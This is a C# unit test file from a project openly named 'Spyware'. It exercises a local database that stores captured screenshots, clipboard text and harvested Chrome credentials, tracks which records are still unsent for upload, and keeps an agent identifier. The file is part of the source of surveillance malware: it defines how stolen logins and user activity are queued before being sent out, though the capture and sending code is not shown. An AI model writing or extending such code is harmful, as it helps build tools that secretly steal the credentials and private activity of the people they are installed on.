using Spyware.Core.Contracts;
using Spyware.Core.Logging;
using Spyware.Storage;
using Xunit;

namespace Spyware.UnitTests;

public class LocalEventRepositoryTests : IDisposable
{
    private readonly string _directory = Path.Combine(Path.GetTempPath(), "spyware-tests-" + Guid.NewGuid().ToString("N"));

    [Fact]
    public void FullCycle_InsertExportAndPrune()
    {
        using var repository = new LocalEventRepository(Path.Combine(_directory, "storage.db"), new SilentLog());
        repository.Initialize();

        long screenshotId = repository.InsertScreenshot(new ScreenshotEvent
        {
            TimestampUtc = DateTime.UtcNow,
            Path = Path.Combine(_directory, "scr.jpg"),
            Width = 1280,
            Height = 720,
            Hash = "abc123",
            Bytes = 12345
        });

        long clipboardId = repository.InsertClipboard(new ClipboardEvent
        {
            TimestampUtc = DateTime.UtcNow,
            Format = "text",
            Content = "hola",
            Length = 4,
            Hash = "def456"
        });

        int credentials = repository.InsertCredentials(new[]
        {
            new CredentialEvent
            {
                Browser = "chrome",
                Profile = "Default",
                Url = "https://example.com",
                Username = "user@example.com",
                Password = null,
                Status = CredentialStatus.EncryptedOnly,
                EncryptedBlobBase64 = "djEwYWJjZGVm"
            }
        });

        Assert.Equal(1, credentials);
        Assert.Equal(3, repository.CountUnsent());
        Assert.Single(repository.GetUnsentScreenshots(10));
        Assert.Single(repository.GetUnsentClipboard(10));
        Assert.Single(repository.GetUnsentCredentials(10));

        repository.MarkScreenshotsSent(new[] { screenshotId });
        repository.MarkClipboardSent(new[] { clipboardId });

        Assert.Single(repository.GetUnsentCredentials(10));
        Assert.Equal(1, repository.CountUnsent());

        IReadOnlyList<string> removed = repository.DeleteOlderThan(DateTime.UtcNow.AddDays(1));

        Assert.Single(removed);
        Assert.Equal(0, repository.CountUnsent());
    }

    [Fact]
    public void Stats_And_Meta_RoundTrip()
    {
        using var repository = new LocalEventRepository(Path.Combine(_directory, "meta.db"), new SilentLog());
        repository.Initialize();

        repository.SetMeta("agent_id", "abc");
        Assert.Equal("abc", repository.GetMeta("agent_id"));

        repository.SetMeta("agent_id", "def");
        Assert.Equal("def", repository.GetMeta("agent_id"));

        Assert.True(repository.GetStats().ContainsKey("credentials_pendientes"));
    }

    public void Dispose()
    {
        try { SqliteClear(); } catch { }

        try
        {
            if (Directory.Exists(_directory)) Directory.Delete(_directory, recursive: true);
        }
        catch { }
    }

    private static void SqliteClear() => Microsoft.Data.Sqlite.SqliteConnection.ClearAllPools();

    private sealed class SilentLog : ILog
    {
        public LogLevel MinimumLevel { get; set; }
        public bool MirrorToConsole { get; set; }

        public void Debug(string message) { }
        public void Info(string message) { }
        public void Warn(string message) { }
        public void Error(string message, Exception? exception = null) { }
    }
}
